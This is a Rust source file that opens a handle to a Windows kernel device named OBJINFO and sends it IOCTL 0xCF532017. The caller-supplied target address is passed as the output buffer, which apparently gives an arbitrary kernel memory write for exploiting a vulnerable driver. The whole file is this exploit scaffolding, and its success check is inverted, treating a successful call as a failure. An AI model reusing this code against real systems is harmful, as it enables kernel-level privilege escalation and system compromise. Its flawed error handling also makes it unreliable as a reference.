use std::ffi::CString;
use std::process;
use std::ptr::null_mut;
use std::ptr;

use winapi::shared::ntdef::HANDLE;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE,
};
use winapi::um::ioapiset::DeviceIoControl;

// Opens a handle to the device and returns it
pub fn get_driver_handle() -> Result<HANDLE, u32> {
    let cstr_device_name =
        CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");

    unsafe {
        let h_device = CreateFileA(
            cstr_device_name.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
            let err = GetLastError();
            eprintln!("[-] Failed to open handle to device. Error code: {}", err);
            Err(err)
        } else {
            println!("[+] Opened handle to device");
            Ok(h_device)
        }
    }
}

// Sends an IOCTL to the driver
pub unsafe fn send_ioctl_to_driver(
    h_device: HANDLE,
    location_to_write_to: u64,
    size: u32,
) -> i32 {
    // Check if the handle is valid
    if h_device == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        eprintln!("[!] Error: invalid driver handle. GetLastError = {}", err);
        process::exit(-1);
    }

    // Input buffer is just the address you want to write to
    let input: u64 = location_to_write_to;
    let mut bytes_returned: u32 = 0;

    let success = unsafe {
        DeviceIoControl(
            h_device,
            0xCF532017, // IOCTL code
            &input as *const _ as *mut _, // input buffer
            size,                          // input buffer size
            location_to_write_to as *mut _,// output buffer = target memory
            size,                          // output buffer size
            &mut bytes_returned,
            ptr::null_mut(),
        )
    };

    if success != 0 {
        let err = unsafe { GetLastError() };
        eprintln!("[-] DeviceIoControl failed. GetLastError = {}", err);
        return -1;
    }

    success
}

